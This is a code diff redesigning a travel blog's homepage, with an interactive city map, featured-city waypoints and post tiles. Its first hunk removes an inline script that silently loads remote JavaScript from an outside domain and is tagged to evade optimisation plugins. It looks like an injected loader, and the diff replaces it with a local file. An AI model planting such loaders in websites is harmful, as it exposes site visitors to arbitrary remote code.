@@ -6,14 +6,7 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png" />
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
 
-  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
-      document.head.appendChild(script);
-  })();
-</script>
+  <script src="consent.js"></script>
 
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -36,34 +29,41 @@
 
 <!-- Amatic SC (logo font) -->
 <link rel="stylesheet" href="fonts/amatic-sc.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,600;0,9..144,700;0,9..144,900;1,9..144,600&family=Work+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
 
 <!-- MapLibre GL (free, open-source map engine — no API key needed) -->
 <link href="https://unpkg.com/maplibre-gl@4.7.1/dist/maplibre-gl.css" rel="stylesheet" />
 <script src="https://unpkg.com/maplibre-gl@4.7.1/dist/maplibre-gl.js"></script>
+<script src="city-photos.js"></script>
 <script src="posts.js"></script>
 
 <style>
   :root{
-    --ink:#1d2a32;
-    --muted:#5b6b75;
-    --sand:#f6f1e7;
-    --teal:#556B2F;
-    --teal-dark:#3C4B21;
-    --coral:#C04020;
-    --card:#ffffff;
-    --shadow:0 10px 30px rgba(20,40,50,.12);
+    --ink:#2b2417;
+    --muted:#82755b;
+    --sand:#ece2cc;
+    --teal:#3f5138;
+    --teal-dark:#2c3a27;
+    --coral:#a8482a;
+    --card:#f6efdd;
+    --shadow:0 12px 30px rgba(43,36,23,.18);
     --maxw:1180px;
+    --paper-2:#e3d7bc;--brass:#b0802f;--brass-lt:#c99a45;--rust-dk:#8a3a20;--green-dk:#2c3a27;
+    --line:rgba(43,36,23,.20);--line-soft:rgba(43,36,23,.12);
   }
   *{box-sizing:border-box}
   html{scroll-behavior:smooth}
   body{
     margin:0;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    font-family:'Work Sans',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
     color:var(--ink);
-    background:var(--sand);
+    background-color:var(--sand);
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60'%3E%3Cg fill='none' stroke='%232b2417' stroke-opacity='0.05' stroke-width='1'%3E%3Cpath d='M0 0H60M0 0V60'/%3E%3C/g%3E%3C/svg%3E"),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='500' height='500' viewBox='0 0 500 500'%3E%3Cg fill='none' stroke='%233f5138' stroke-opacity='0.06' stroke-width='1.4'%3E%3Cpath d='M70 250c0-90 70-155 165-155s195 60 195 155-95 165-195 165S70 340 70 250z'/%3E%3Cpath d='M120 250c0-62 50-108 115-108s140 44 140 108-70 122-140 122-115-60-115-122z'/%3E%3Cpath d='M170 250c0-36 28-62 65-62s85 26 85 62-42 72-85 72-65-36-65-72z'/%3E%3Cpath d='M-40 90c70-34 150-20 195 30M330 -10c34 60 118 70 190 48M-30 470c82 14 140-36 175-84'/%3E%3C/g%3E%3C/svg%3E");
+    background-position:0 0,center;
     line-height:1.6;
   }
-  h1,h2,h3{font-family:Georgia,"Amatic SC",serif;letter-spacing:.2px}
+  h1,h2,h3{font-family:'Fraunces',Georgia,serif;font-weight:700;letter-spacing:-.01em}
   a{color:inherit;text-decoration:none}
 
   /* ---------- Menu bar ---------- */
@@ -83,7 +83,7 @@
   .brand small{display:block;font-family:-apple-system,sans-serif;font-weight:500;font-size:.62rem;letter-spacing:.18em;text-transform:uppercase;color:var(--muted)}
   nav.links a{
     margin-left:26px;font-weight:600;font-size:.82rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);
-    padding-bottom:3px;border-bottom:2px solid transparent;transition:.2s;
+    padding-bottom:3px;border-bottom:2px solid transparent;transition:.2s;white-space:nowrap;
   }
   nav.links a:hover{color:var(--coral);border-color:var(--coral)}
   .menu-toggle{display:none}
@@ -121,10 +121,10 @@
   .legend-toggle.visible{display:inline-flex;}
   .map-legend b{display:block;margin-bottom:6px;font-size:.82rem;padding-right:16px}
   .legend-row{display:flex;align-items:center;gap:8px;color:var(--muted);margin-top:4px}
-  .legend-bubble{display:inline-block;border-radius:50%;background:rgba(192,64,32,.55);border:1.5px solid var(--coral)}
-  .legend-bubble.purple{background:rgba(126,87,194,.55);border-color:#7e57c2}
-  .legend-bubble.pink{background:rgba(244,143,177,.55);border-color:#f48fb1}
-  .legend-bubble.yellow{background:rgba(255,224,130,.55);border-color:#ffe082}
+  .legend-bubble{display:inline-block;border-radius:50%;background:rgba(138,58,32,.55);border:1.5px solid #8a3a20}
+  .legend-bubble.purple{background:rgba(168,72,42,.5);border-color:#a8482a}
+  .legend-bubble.pink{background:rgba(176,128,47,.5);border-color:#b0802f}
+  .legend-bubble.yellow{background:rgba(138,154,91,.55);border-color:#8a9a5b}
   .map-note{max-width:var(--maxw);margin:0 auto;padding:6px 22px 0;color:var(--muted);font-size:.78rem;text-align:center}
 
   /* Tooltip / popup */
@@ -194,9 +194,117 @@
     .about h3{font-size:1.2rem;margin-bottom:6px}
     .about p{font-size:.9rem;margin-bottom:8px}
   }
+
+  /* ================= EXPLORER THEME (overrides) ================= */
+  header.nav{background:rgba(236,226,204,.93);border-bottom:1px solid var(--ink)}
+  .brand .dot{display:none}
+  .brand small{font-family:'Work Sans',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-weight:600;font-size:.82rem;letter-spacing:.08em}
+  nav.links a:hover{color:var(--coral);border-color:var(--brass)}
+
+  .hero p.kicker{font-family:'Work Sans',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--teal);font-weight:600;font-size:.82rem;letter-spacing:.08em}
+  .hero h1{font-family:'Fraunces',serif;font-weight:900;font-size:clamp(2.6rem,6.4vw,4.4rem);line-height:1}
+  .hero h1 em{font-family:'Amatic SC',cursive;font-style:normal}
+
+  #map{border-radius:0;border:1px solid var(--ink);box-shadow:0 16px 40px rgba(43,36,23,.22)}
+  .map-wrap::before,.map-wrap::after{content:"";position:absolute;width:26px;height:26px;z-index:6;pointer-events:none}
+  .map-wrap::before{left:30px;top:8px;border-left:3px solid var(--brass);border-top:3px solid var(--brass)}
+  .map-wrap::after{right:30px;bottom:8px;border-right:3px solid var(--brass);border-bottom:3px solid var(--brass)}
+  .map-legend{background:var(--card);border:1px solid var(--ink);border-radius:0;box-shadow:0 8px 20px rgba(43,36,23,.2)}
+  .map-legend b{font-family:'Work Sans',monospace;font-size:.66rem;letter-spacing:.12em;text-transform:uppercase}
+  .legend-toggle{background:var(--card);border:1px solid var(--ink);border-radius:0;color:var(--coral)}
+  .map-note{font-family:'Work Sans',monospace;font-size:.7rem;letter-spacing:.05em}
+
+  .maplibregl-popup-content{background:var(--card);border:1px solid var(--ink);border-radius:0;box-shadow:4px 4px 0 rgba(43,36,23,.35)}
+  .tip-city{font-family:'Fraunces',serif;font-weight:700}
+  .tip-num{color:var(--coral);font-family:'Fraunces',serif}
+  .tip-num span{font-family:'Work Sans',monospace}
+  .explore-btn{border-radius:0;background:var(--coral);font-family:'Work Sans',monospace;text-transform:uppercase;letter-spacing:.08em;font-size:.72rem}
+  .explore-btn:hover{background:var(--rust-dk)}
+
+  .section-head .cx{width:22px;height:22px;color:var(--brass);display:block;margin:0 auto 6px}
+  .section-head .kicker{font-family:'Work Sans',monospace;color:var(--teal);letter-spacing:.22em}
+
+  .about{background:var(--card);border:1px solid var(--ink);border-radius:0;box-shadow:0 12px 28px rgba(43,36,23,.2);position:relative;gap:44px}
+  .about::after{content:"";position:absolute;left:6px;right:6px;top:6px;bottom:6px;border:1px solid var(--line-soft);pointer-events:none}
+  .about>*{position:relative;z-index:1}
+  .about .photo-frame{background:#fffdf6;border:1px solid var(--line);padding:10px 10px 40px;transform:rotate(-2.4deg);box-shadow:0 12px 26px rgba(43,36,23,.28);position:relative}
+  .about .photo-frame img{width:100%;aspect-ratio:1/1;object-fit:cover;border-radius:0;display:block;filter:sepia(.2) saturate(.95)}
+  .about .photo-frame::after{content:"📍 Giza, Egypt";position:absolute;left:0;right:0;bottom:8px;text-align:center;font-family:'Amatic SC',cursive;font-size:1.4rem;color:var(--muted)}
+  .about .sig{font-family:'Amatic SC',cursive;color:var(--coral);font-size:1.9rem;font-style:normal}
+  @media(max-width:880px){.about .photo-frame{padding:6px 6px 26px}.about .photo-frame::after{font-size:1rem;bottom:3px}}
+
+  .tile{border:1px solid var(--ink);border-radius:0;box-shadow:0 8px 20px rgba(43,36,23,.14)}
+  .tile:hover{box-shadow:0 16px 32px rgba(43,36,23,.22)}
+  .tile .photo{filter:sepia(.18) saturate(.95)}
+  .tile .tag{background:var(--coral);border-radius:0;font-family:'Work Sans',monospace;letter-spacing:.1em}
+  .tile .date{font-family:'Work Sans',monospace;color:var(--coral);letter-spacing:.1em}
+  .tile .readmore{font-family:'Work Sans',monospace;color:var(--coral);text-transform:uppercase;letter-spacing:.08em;font-size:.72rem}
+  .all-stories a{background:var(--coral);border-radius:0;font-family:'Work Sans',monospace;text-transform:uppercase;letter-spacing:.1em;font-size:.74rem;padding:14px 30px}
+  .all-stories a:hover{background:var(--rust-dk)}
+
+  footer{background:var(--green-dk);color:#d8d0b8;border-top:5px solid var(--brass)}
+  footer .brand{color:var(--brass-lt)}
+  footer .foot-links a{color:#c6bd9f}
+  footer .foot-links a:hover{color:#fff;border-color:var(--brass)}
+
+  /* email signup -> field dispatch (mailing-list.js injects its own CSS later, so use !important) */
+  .nra-ml{background:var(--card)!important;border:1px solid var(--ink)!important;border-radius:0!important}
+  .nra-ml .ml-kicker{font-family:'Work Sans',monospace!important;color:var(--teal)!important;letter-spacing:.2em!important}
+  .nra-ml h2{font-family:'Fraunces',serif!important;font-weight:700!important}
+  .nra-ml input{border-radius:0!important;border:1px solid var(--ink)!important;background:var(--sand)!important}
+  .nra-ml button{border-radius:0!important;background:var(--coral)!important;font-family:'Work Sans',monospace!important;text-transform:uppercase!important;letter-spacing:.08em!important}
+  .nra-ml button:hover{background:var(--rust-dk)!important}
+
+  /* ---- full-design: social proof under hero ---- */
+  .social-proof{display:flex;align-items:center;justify-content:center;gap:13px;margin:18px auto 0;flex-wrap:wrap}
+  .avatars{display:flex}
+  .avatars span{width:32px;height:32px;border-radius:50%;border:2px solid var(--sand);margin-left:-9px;display:flex;align-items:center;justify-content:center;font-family:'Fraunces',serif;font-size:.76rem;font-weight:700;color:#fff}
+  .avatars span:first-child{margin-left:0}
+  .social-proof p{margin:0;font-size:.82rem;color:var(--muted)}
+  .social-proof b{color:var(--ink)}
+
+  /* ---- full-design: waypoint featured cities on a dashed route ---- */
+  .stories{max-width:var(--maxw);margin:30px auto 36px;padding:0 22px;position:relative;display:flex;gap:26px;justify-content:space-evenly;flex-wrap:wrap}
+  .stories::before{content:"";position:absolute;left:8%;right:8%;top:44px;border-top:2px dashed rgba(168,72,42,.4);z-index:0}
+  .story{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;gap:9px;cursor:pointer;transition:transform .2s;text-decoration:none}
+  .story:hover{transform:translateY(-5px)}
+  .story .frame{position:relative;width:92px;height:92px;border:2px solid var(--ink);background:var(--sand);padding:4px}
+  .story:hover .frame{border-color:var(--coral)}
+  .story .frame .ph{width:100%;height:100%;background-size:cover;background-position:center;background-color:var(--paper-2);filter:sepia(.18) saturate(.95)}
+  .story .cat{display:inline-block;margin-top:6px;color:#fff;font-family:'Work Sans',monospace;font-size:.54rem;font-weight:600;letter-spacing:.08em;text-transform:uppercase;padding:3px 8px;line-height:1.4}
+  .story .cat.fx-new{background:var(--coral)}
+  .story .cat.fx-top{background:var(--teal)}
+  .story .cat.fx-under{background:var(--brass)}
+  .story .cat.fx-season{background:var(--rust-dk)}
+  .story .frame .pin{position:absolute;bottom:-8px;left:50%;transform:translateX(-50%);width:10px;height:10px;border-radius:50%;background:var(--brass);border:2px solid var(--sand);box-shadow:0 0 6px rgba(176,128,47,.6)}
+  .story figcaption{text-align:center}
+  .story figcaption .nm{display:block;font-family:'Fraunces',serif;font-weight:700;font-size:1.1rem;color:var(--ink)}
+  .story figcaption small{display:block;font-family:'Work Sans',monospace;font-weight:400;color:var(--teal);font-size:.58rem;letter-spacing:.1em;text-transform:uppercase;margin-top:2px}
+  .story figcaption small .hv{color:var(--coral)}
+  @media(max-width:560px){.stories::before{display:none}.story .frame{width:78px;height:78px}}
+
+  /* ---- full-design: rust italic emphasis in section heads ---- */
+  .section-head h2 em{font-style:italic;color:var(--coral)}
+
+  /* ---- full-design: mono handle under About name ---- */
+  .about .handle{font-family:'Work Sans',monospace;color:var(--teal);font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;margin:0 0 12px}
+
+  /* ---- full-design: dossier post tiles (author row + social row) ---- */
+  .tile .author{display:flex;align-items:center;gap:10px;padding:12px 16px;border-bottom:1px solid var(--line)}
+  .tile .author .av{width:32px;height:32px;border-radius:50%;background:var(--coral);color:#fff;display:flex;align-items:center;justify-content:center;font-family:'Fraunces',serif;font-weight:700;font-size:.76rem;flex:none}
+  .tile .author b{font-size:.82rem;color:var(--ink)}
+  .tile .author small{display:block;color:var(--muted);font-family:'Work Sans',monospace;font-size:.62rem;letter-spacing:.06em}
+  .tile .social-row{display:flex;align-items:center;gap:15px;margin-top:14px;padding-top:12px;border-top:1px dashed var(--line);font-family:'Work Sans',monospace;font-size:.68rem;letter-spacing:.04em;color:var(--muted)}
+  .tile .social-row .lk{color:var(--coral)}
+
+  /* ---- full-design: field-dispatch signup (dashed route + inset line) ---- */
+  .nra-ml{position:relative!important;overflow:hidden!important;background-color:var(--card)!important;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='760' height='230' viewBox='0 0 760 230'%3E%3Cg fill='none'%3E%3Cpath d='M20 185 C 140 120, 230 205, 340 150 S 540 60, 660 95' stroke='%23a8482a' stroke-width='2.5' stroke-dasharray='7 8' stroke-linecap='round' opacity='.7'/%3E%3Ccircle cx='20' cy='185' r='6' fill='%233f5138'/%3E%3Ccircle cx='340' cy='150' r='4.5' fill='%23b0802f'/%3E%3Ccircle cx='500' cy='96' r='4.5' fill='%23b0802f'/%3E%3Cpath d='M648 83 L672 107 M672 83 L648 107' stroke='%23a8482a' stroke-width='5' stroke-linecap='round'/%3E%3Ccircle cx='660' cy='95' r='20' stroke='%23a8482a' stroke-width='1.5' opacity='.5' stroke-dasharray='3 5'/%3E%3C/g%3E%3C/svg%3E")!important;background-repeat:no-repeat!important;background-position:right -20px bottom -14px!important}
+  .nra-ml::after{content:"";position:absolute;left:6px;right:6px;top:6px;bottom:6px;border:1px solid var(--line-soft);pointer-events:none}
+  .nra-ml>*{position:relative;z-index:1}
 </style>
 </head>
 <body>
+<svg style="position:absolute;width:0;height:0" aria-hidden="true"><symbol id="compass" viewBox="0 0 100 100"><circle cx="50" cy="50" r="47" fill="none" stroke="currentColor" stroke-width="1.6"/><circle cx="50" cy="50" r="39" fill="none" stroke="currentColor" stroke-width="0.8" stroke-dasharray="1.5 3"/><polygon points="50,6 57,50 50,50" fill="#a8482a"/><polygon points="50,6 43,50 50,50" fill="#8a3a20"/><polygon points="50,94 57,50 50,50" fill="currentColor" opacity=".85"/><polygon points="50,94 43,50 50,50" fill="currentColor" opacity=".55"/><polygon points="94,50 50,43 50,50" fill="currentColor" opacity=".7"/><polygon points="94,50 50,57 50,50" fill="currentColor" opacity=".5"/><polygon points="6,50 50,43 50,50" fill="currentColor" opacity=".7"/><polygon points="6,50 50,57 50,50" fill="currentColor" opacity=".5"/><circle cx="50" cy="50" r="3.5" fill="#a8482a"/></symbol></svg>
 
 <!-- ===== Menu bar ===== -->
 <header class="nav">
@@ -213,10 +321,19 @@
 <a id="top"></a>
 <div class="hero">
   <p class="kicker">A world worth exploring</p>
-  <h1>Where will you roam next?</h1>
-  <p class="sub">Scan the globe to discover the world's most traveled cities & destinations. Click on a location bubble to learn more</p>
+  <h1>Where will you <em>roam</em> next?</h1>
+  <div class="social-proof">
+    <div class="avatars">
+      <span style="background:#a8482a">J</span><span style="background:#3f5138">M</span><span style="background:#b0802f">A</span><span style="background:#8a3a20">S</span><span style="background:#6f7d4a">K</span>
+    </div>
+    <p><b id="sp-cities">248 cities</b> &middot; <b>60+ countries</b> &middot; guides with insight from real travelers</p>
+  </div>
 </div>
 
+<!-- ===== Waypoint featured cities ===== -->
+<div class="stories" id="featured-cities" aria-label="Featured cities"></div>
+
+<p class="sub" style="max-width:620px;margin:0 auto 14px;text-align:center;color:var(--muted);font-size:1.05rem">Scan the globe to discover the world's most traveled cities & destinations. Click on a location bubble to learn more</p>
 <div class="map-wrap">
   <div id="map"></div>
   <div class="map-legend">
@@ -230,7 +347,7 @@
   </div>
   <button id="legend-toggle" class="legend-toggle" aria-label="Show the map key">⊕ Key</button>
 </div>
-<p class="map-note" id="map-note">Drag to pan · scroll to zoom · hover a bubble for city stats · click a city to open its page. Figures are approximate starter data (Euromonitor / Mastercard rankings) and will be refined.</p>
+<p class="map-note" id="map-note">Drag to pan · scroll to zoom · hover a bubble for city stats · click a city to open its page.<br><em>Figures are estimates.</em></p>
 
 <!-- ===== Email signup ===== -->
 <section class="block">
@@ -240,12 +357,14 @@
 <!-- ===== About ===== -->
 <section class="block" id="about">
   <div class="section-head">
-    <h2>About Me</h2>
+    <svg class="cx"><use href="#compass"/></svg>
+    <h2>About <em>Me</em></h2>
   </div>
   <div class="about">
-    <img src="pyramids-web.jpg" alt="Jeff at the Pyramids of Giza" />
+    <div class="photo-frame"><img src="pyramids-web.jpg" alt="Jeff at the Pyramids of Giza" /></div>
     <div>
       <h3>Hi, I'm Jeff</h3>
+      <p class="handle">Founder &amp; chief roamer &middot; 60+ countries</p>
       <p>I got bit by the travel bug a bit later than many, but like they say, it's never too late to start anything. What started for me as an escape from the stresses of life has turned into a love of exploration and discovery. I have been fortunate enough to have visited over 60 countries in 5 continents so far, with plans for many more.</p>
       <p>I started this website to share my experiences and to hopefully provide useful tools for fellow travelers to successfully navigate their next adventures. I hope that you find them helpful.</p>
       <p class="sig">— happy roaming</p>
@@ -256,8 +375,9 @@
 <!-- ===== Latest stories (top 3 from posts.js) ===== -->
 <section class="block" id="blog">
   <div class="section-head">
+    <svg class="cx"><use href="#compass"/></svg>
     <p class="kicker">Stories from the road</p>
-    <h2>Latest Posts</h2>
+    <h2>Latest <em>Posts</em></h2>
   </div>
   <div class="tiles" id="latest-tiles"></div>
   <div class="all-stories"><a href="blog.html">See all stories &rarr;</a></div>
@@ -277,6 +397,7 @@
     <a href="privacy.html">Privacy Policy</a>
     <a href="terms.html">Terms of Service</a>
   </div>
+  <small class="foot-disclosure" style="display:block;width:100%;color:#d8d0b8">Some links on this site are affiliate links: if you book through them we may earn a small commission at NO EXTRA COST TO YOU.<br>Using our links helps keep the site up to date. <b><em>THANK YOU FOR YOUR CONTRIBUTION.</em></b> Details in our <a href="privacy.html" style="text-decoration:underline;color:#d8d0b8">Privacy Policy</a>.</small>
 </footer>
 
 <script>
@@ -538,6 +659,51 @@ const CITIES = [
   {city:"Cairo", country:"Egypt", lng:31.2357, lat:30.0444, visitors:9.0, est:true},
 ];
 
+/* ===== Featured cities — 4 curated slots (real photos + guide links) ===== */
+(function(){
+  /* Which city fills each slot will be driven by real data soon
+     (newest guide, top visited, editor's underrated pick, seasonal pick).
+     For now these are easy-to-edit placeholders — just change the "city"
+     values below. Each must match a city name in the CITIES list above. */
+  var FEATURED = [
+    { label:"New article",            city:"Kyoto",     cls:"fx-new" },
+    { label:"Top visited",            city:"Hong Kong", cls:"fx-top" },
+    { label:"Underrated pick", city:"Lisbon",    cls:"fx-under" },
+    { label:"Seasonal pick",          city:"Marrakech", cls:"fx-season" }
+  ];
+  function ph(name){
+    var rec = (window.NRA_CITY_PHOTO || {})[name];
+    return (rec && rec.img) ? rec.img : "";
+  }
+  function find(name){
+    if (typeof CITIES === "undefined") return null;
+    for (var i=0;i<CITIES.length;i++){ if (CITIES[i].city === name) return CITIES[i]; }
+    return null;
+  }
+  function render(){
+    var el = document.getElementById("featured-cities");
+    if (!el) return;
+    // reflect the real catalogue size in the social-proof line
+    var sp = document.getElementById("sp-cities");
+    if (sp && typeof CITIES !== "undefined") sp.textContent = CITIES.length + " cities";
+    el.innerHTML = FEATURED.map(function(f){
+      var c = find(f.city);
+      var country = c ? c.country : "";
+      var img = ph(f.city);
+      var bg = img ? "background-image:url('"+img+"')" : "";
+      return '<a class="story" href="city.html?city='+encodeURIComponent(f.city)+'">'
+        + '<div class="frame"><div class="ph" style="'+bg+'"></div><span class="pin"></span></div>'
+        + '<figcaption><span class="nm">'+f.city+'</span>'
+        + '<span class="cat '+f.cls+'">'+f.label+'</span>'
+        + (country ? '<small>'+country+'</small>' : '')
+        + '</figcaption></a>';
+    }).join("");
+  }
+  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", render);
+  else render();
+})();
+
+
 const geojson = {
   type:"FeatureCollection",
   features: CITIES.map(c => ({
@@ -565,10 +731,10 @@ map.on("load", () => {
   // under 1M small yellow, under 5M slightly larger pink, under 12M slightly
   // larger purple, 12M+ same size/color the map has always used (coral, scaling on up).
   const bubbleColor = ["step", ["get","visitors"],
-    "#ffe082",
-    1, "#f48fb1",
-    5, "#7e57c2",
-    12, "#C04020"
+    "#8a9a5b",
+    1, "#b0802f",
+    5, "#a8482a",
+    12, "#8a3a20"
   ];
   const bubbleRadius = ["step", ["get","visitors"],
     6,
@@ -618,7 +784,7 @@ map.on("load", () => {
   // Update hint text for mobile users
   if(isTouch){
     document.getElementById("legend-hint").textContent = "Tap a bubble for details";
-    document.getElementById("map-note").textContent = "Pinch to zoom · drag to pan · tap a city bubble to open its card. Figures are approximate starter data (Euromonitor / Mastercard rankings) and will be refined.";
+    document.getElementById("map-note").innerHTML = "Pinch to zoom &middot; drag to pan &middot; tap a city bubble to open its card.<br><em>Figures are estimates.</em>";
   }
 
   function popupHTML(p, withButton){
@@ -673,8 +839,19 @@ map.on("load", () => {
   function renderLatest(){
     const wrap = document.getElementById("latest-tiles");
     if(!wrap || !window.NRA_POSTS_UTIL) return;
-    wrap.innerHTML = window.NRA_POSTS_UTIL.byNewest().slice(0,3).map(p => `
+    const fmtNum = n => n >= 1000 ? (n/1000).toFixed(n >= 10000 ? 0 : 1).replace(/\.0$/,"") + "k" : String(n);
+    wrap.innerHTML = window.NRA_POSTS_UTIL.byNewest().slice(0,3).map(p => {
+      const name = p.authorName || "Jeff";
+      const av = name.trim().charAt(0).toUpperCase();
+      const loc = (p.location || "").toUpperCase();
+      const meta = [loc, window.NRA_POSTS_UTIL.shortDate(p.date).toUpperCase()].filter(Boolean).join(" \u00b7 ");
+      const social = [];
+      if (typeof p.likes === "number") social.push(`<span class="lk">\u2665 ${fmtNum(p.likes)}</span>`);
+      if (typeof p.views === "number") social.push(`<span>\uD83D\uDC41 ${fmtNum(p.views)}</span>`);
+      const socialRow = social.length ? `<div class="social-row">${social.join("")}</div>` : "";
+      return `
       <a class="tile" href="post.html?post=${encodeURIComponent(p.slug)}">
+        <div class="author"><span class="av">${av}</span><span><b>${name}</b><small>${meta}</small></span></div>
         <div class="photo" style="background-image:url('${window.NRA_POST_PHOTO ? window.NRA_POST_PHOTO(p,600,400) : `https://picsum.photos/seed/${p.seed}-nra/600/400`}')">
           <span class="tag">${p.tag}</span>
         </div>
@@ -683,8 +860,10 @@ map.on("load", () => {
           <h3>${p.title}</h3>
           <p>${p.excerpt}</p>
           <span class="readmore">Read story &rarr;</span>
+          ${socialRow}
         </div>
-      </a>`).join("");
+      </a>`;
+    }).join("");
   }
   renderLatest();
   /* Redraw when articles written in the online editor arrive (blog-remote.js) */
